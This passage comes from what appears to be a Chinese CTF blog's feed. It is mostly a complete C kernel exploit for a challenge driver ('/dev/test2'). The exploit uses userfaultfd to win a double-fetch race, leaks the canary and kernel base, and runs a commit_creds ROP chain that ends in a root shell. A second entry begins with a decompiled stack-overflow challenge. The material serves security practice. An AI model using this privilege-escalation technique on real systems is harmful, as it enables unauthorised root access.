class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">errExit</span><span class="params">(<span class="keyword">char</span> *err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RegisterUserfault</span><span class="params">(<span class="keyword">void</span> *fault_page, <span class="keyword">void</span> *handler)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> thr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;[-] ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ur.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)fault_page;</span><br><span class="line">    ur.range.len = <span class="number">0x1000</span>;</span><br><span class="line">    ur.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;[-] ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> s = pthread_create(&amp;thr, <span class="literal">NULL</span>, handler, (<span class="keyword">void</span> *)uffd);</span><br><span class="line">    <span class="keyword">if</span> (s != <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;[-] pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">sleep_handle</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> uffd;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    <span class="keyword">ssize_t</span> nread;</span><br><span class="line"></span><br><span class="line">    uffd = (<span class="keyword">long</span>)arg;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] sleep handler created&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        <span class="keyword">int</span> nready;</span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[+] sleep handler unblocked&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">        nread = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line"></span><br><span class="line">        sleep(<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;EOF on userfaultfd!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            errExit(<span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">char</span> *page = (<span class="keyword">char</span> *)mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (page == MAP_FAILED)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;[-] mmap err&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">        <span class="comment">// init page</span></span><br><span class="line">        <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(page));</span><br><span class="line">        <span class="comment">// *(page + 0x201) = 0x64;</span></span><br><span class="line"></span><br><span class="line">        uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)page;</span><br><span class="line">        uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)msg.arg.pagefault.address &amp;</span><br><span class="line">                 ~(<span class="number">0x1000</span> - <span class="number">1</span>);</span><br><span class="line">        uc.len = <span class="number">0x1000</span>;</span><br><span class="line">        uc.mode = <span class="number">0</span>;</span><br><span class="line">        uc.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uc) == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[+] sleep handler done&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> prepare_kernel_cred = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> commit_creds = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> pop_rdi = <span class="number">0xffffffff810835c0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> swapgs_pop = <span class="number">0xffffffff8106c984</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> iretq = <span class="number">0xffffffff81c014f5</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> init_cred = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> canary;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">overflow_handle</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> uffd;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    <span class="keyword">ssize_t</span> nread;</span><br><span class="line"></span><br><span class="line">    uffd = (<span class="keyword">long</span>)arg;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] sleep handler created&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        <span class="keyword">int</span> nready;</span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[+] sleep handler unblocked&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">        nread = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line"></span><br><span class="line">        sleep(<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;EOF on userfaultfd!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            errExit(<span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">char</span> *page = (<span class="keyword">char</span> *)mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (page == MAP_FAILED)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;[-] mmap err&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">        <span class="comment">// init page</span></span><br><span class="line">        <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(page));</span><br><span class="line">        <span class="comment">// *(page + 0x201) = 0x64;</span></span><br><span class="line"></span><br><span class="line">        uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)page;</span><br><span class="line">        uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)msg.arg.pagefault.address &amp;</span><br><span class="line">                 ~(<span class="number">0x1000</span> - <span class="number">1</span>);</span><br><span class="line">        uc.len = <span class="number">0x1000</span>;</span><br><span class="line">        uc.mode = <span class="number">0</span>;</span><br><span class="line">        uc.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uc) == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[+] sleep handler done&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_hex</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data :\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; (size / <span class="number">8</span>); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i / <span class="number">2</span> &lt; <span class="number">10</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d  &quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (i / <span class="number">2</span> &lt; <span class="number">100</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; %16llx&quot;</span>, *(<span class="keyword">size_t</span> *)(buf + i * <span class="number">8</span>));</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">write_handler</span><span class="params">(<span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    sleep(<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;now change uesed&quot;</span>);</span><br><span class="line">    write(fd, buf, <span class="number">0x200</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">control_handler</span><span class="params">(<span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    write(fd, buf, <span class="number">0xf0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">read_handler</span><span class="params">(<span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;now read buffer&quot;</span>);</span><br><span class="line">    read(fd, buf, <span class="number">0x200</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    signal(SIGSEGV, get_shell);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/test2&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] open test2 error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x2000</span>);</span><br><span class="line">    <span class="keyword">char</span> *page = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">char</span> *page2 = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">pthread_t</span> thr[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_addr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_base;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_offset;</span><br><span class="line"></span><br><span class="line">    RegisterUserfault(page, sleep_handle);</span><br><span class="line">    write(fd, buf, <span class="number">0x8</span>);</span><br><span class="line">    sleep(<span class="number">2</span>);</span><br><span class="line">    <span class="comment">// read_handler(buf);</span></span><br><span class="line">    pthread_create(&amp;thr[<span class="number">1</span>], <span class="literal">NULL</span>, write_handler, buf);</span><br><span class="line">    pthread_create(&amp;thr[<span class="number">0</span>], <span class="literal">NULL</span>, control_handler, buf);</span><br><span class="line">    <span class="comment">// write(fd, page, 0xf0);</span></span><br><span class="line">    read_handler(buf);</span><br><span class="line">    <span class="comment">// pthread_join(thr[0], NULL);</span></span><br><span class="line">    pthread_join(thr[<span class="number">1</span>], <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    canary = *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf + <span class="number">32</span> * <span class="number">8</span>);</span><br><span class="line">    kernel_addr = *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf + <span class="number">47</span> * <span class="number">8</span>);</span><br><span class="line">    kernel_base = kernel_addr - <span class="number">0x426939</span>;</span><br><span class="line">    kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] get canary: %p\n&quot;</span>, canary);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] get kernel base: %p\n&quot;</span>, kernel_base);</span><br><span class="line"></span><br><span class="line">    prepare_kernel_cred = <span class="number">0xb9550</span> + kernel_base;</span><br><span class="line">    commit_creds = <span class="number">0xb91e0</span> + kernel_base;</span><br><span class="line">    init_cred = <span class="number">0x165b400</span> + kernel_base;</span><br><span class="line">    swapgs_pop = swapgs_pop + kernel_offset;</span><br><span class="line">    iretq = iretq + kernel_offset;</span><br><span class="line">    pop_rdi = pop_rdi + kernel_offset;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// RegisterUserfault(page2, overflow_handle);</span></span><br><span class="line">    pthread_create(&amp;thr[<span class="number">0</span>], <span class="literal">NULL</span>, write_handler, buf);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf + ((i++) * <span class="number">8</span>)) = canary;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf + ((i++) * <span class="number">8</span>)) = canary;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf + ((i++) * <span class="number">8</span>)) = canary;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf + ((i++) * <span class="number">8</span>)) = canary;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf + ((i++) * <span class="number">8</span>)) = pop_rdi;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf + ((i++) * <span class="number">8</span>)) = init_cred;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf + ((i++) * <span class="number">8</span>)) = commit_creds;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf + ((i++) * <span class="number">8</span>)) = swapgs_pop;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf + ((i++) * <span class="number">8</span>)) = swapgs_pop;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf + ((i++) * <span class="number">8</span>)) = iretq;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf + ((i++) * <span class="number">8</span>)) = get_shell;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf + ((i++) * <span class="number">8</span>)) = user_cs;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf + ((i++) * <span class="number">8</span>)) = user_rflags;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf + ((i++) * <span class="number">8</span>)) = user_sp;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf + ((i++) * <span class="number">8</span>)) = user_ss;</span><br><span class="line">    write(fd, buf, <span class="number">0xe0</span>);</span><br><span class="line">    pthread_join(thr[<span class="number">0</span>], <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    read(fd, buf, <span class="number">0x200</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这周四道题目难度不算是很大，不过那个<code>easy printf</code>我确实没什么思路，有兴趣的师傅可以去看一下（然后可怜我告诉我一下）。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Kernel-pwn1&quot;&gt;&lt;a href=&quot;#Kernel-pwn1&quot; class=&quot;headerlink&quot; title=&quot;Kernel pwn1&quot;&gt;&lt;/a&gt;Kernel pwn1&lt;/h2&gt;&lt;p&gt;题目非常简单，就是一道非常普通的内核堆题，不过由于思想有点活跃导致开</summary>
      
    
    
    
    <category term="pwn" scheme="https://cv196082.gitee.io/categories/pwn/"/>
    
    
    <category term="Double Fetch" scheme="https://cv196082.gitee.io/tags/Double-Fetch/"/>
    
    <category term="pt_regs" scheme="https://cv196082.gitee.io/tags/pt-regs/"/>
    
    <category term="tty_struct" scheme="https://cv196082.gitee.io/tags/tty-struct/"/>
    
    <category term="fastbin" scheme="https://cv196082.gitee.io/tags/fastbin/"/>
    
  </entry>
  
  <entry>
    <title>practice Ⅰ</title>
    <link href="https://cv196082.gitee.io/2022/10/16/practice%E2%85%A0/"/>
    <id>https://cv196082.gitee.io/2022/10/16/practice%E2%85%A0/</id>
    <published>2022-10-16T05:34:04.000Z</published>
    <updated>2022-10-16T05:41:13.448Z</updated>
    
    <content type="html"><![CDATA[<h2 id="练题笔记"><a href="#练题笔记" class="headerlink" title="练题笔记"></a>练题笔记</h2><p>已经学了一段时间内核了，感觉自己在基础知识方面比较欠缺，所以打算回过头去看一下相关书籍深入学习一下基础知识，在学习途中保持pwn题训练。</p><h2 id="easy-stack"><a href="#easy-stack" class="headerlink" title="easy stack"></a>easy stack</h2><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>题目逻辑很简单</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">128</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  alarm(<span class="number">0x3C</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  read_n(s, <span class="number">0x100</span>LL);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 